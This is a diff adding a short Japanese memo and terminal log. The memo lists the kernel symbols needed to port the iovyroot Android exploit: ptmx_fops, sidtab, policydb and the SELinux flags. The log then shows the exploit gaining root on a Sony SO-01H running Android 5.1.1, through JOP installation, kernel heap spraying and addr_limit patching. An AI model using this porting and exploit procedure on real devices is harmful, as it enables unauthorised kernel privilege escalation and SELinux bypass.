@@ -1,0 +1,43 @@
+■memo
+必要なアドレスは
+ptmx_fops
+sidtab
+policydb
+selinux_enabled
+selinux_enforcing
+
+■結果
+shell@SO-01H:/ $ /data/local/tmp/iovyroot
+WARNING: linker: /data/local/tmp/iovyroot: unused DT entry: type 0x6ffffffe arg 0xbb8
+WARNING: linker: /data/local/tmp/iovyroot: unused DT entry: type 0x6fffffff arg 0x1
+iovyroot by zxz0O0
+poc by idler1984
+
+[+] Changing fd limit from 1024 to 4096
+[+] Changing process priority to highest
+[+] Getting pipes
+[+] Allocating memory
+[+] Installing JOP
+    [+] Patching address 0xffffffc001950630
+    [+] Start map/unmap thread
+    [+] Start write thread
+    [+] Spraying kernel heap
+    [+] Start read thread
+    [+] Done
+[+] Patching addr_limit
+    [+] Patching address 0xffffffc031abc008
+    [+] Start map/unmap thread
+    [+] Start write thread
+    [+] Spraying kernel heap
+    [+] Start read thread
+    [+] Done
+[+] Removing JOP
+got root lmao
+root@SO-01H:/ # id
+uid=0(root) gid=0(root) groups=1004(input),1007(log),1011(adb),1015(sdcard_rw),1026(drmrpc),1028(sdcard_r),2993(trimarea),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats) context=u:r:init_shell:s0
+
+root@SO-01H:/ # getprop ro.build.description
+SO-01H-user 5.1.1 32.0.B.0.443 3936530859 release-keys
+
+root@SO-01H:/ # cat /proc/version
+Linux version 3.10.49-perf-g7498fe6 (BuildUser@BuildHost) (gcc version 4.9.x-google 20140827 (prerelease) (GCC) ) #1 SMP PREEMPT Thu Nov 19 21:23:00 2015
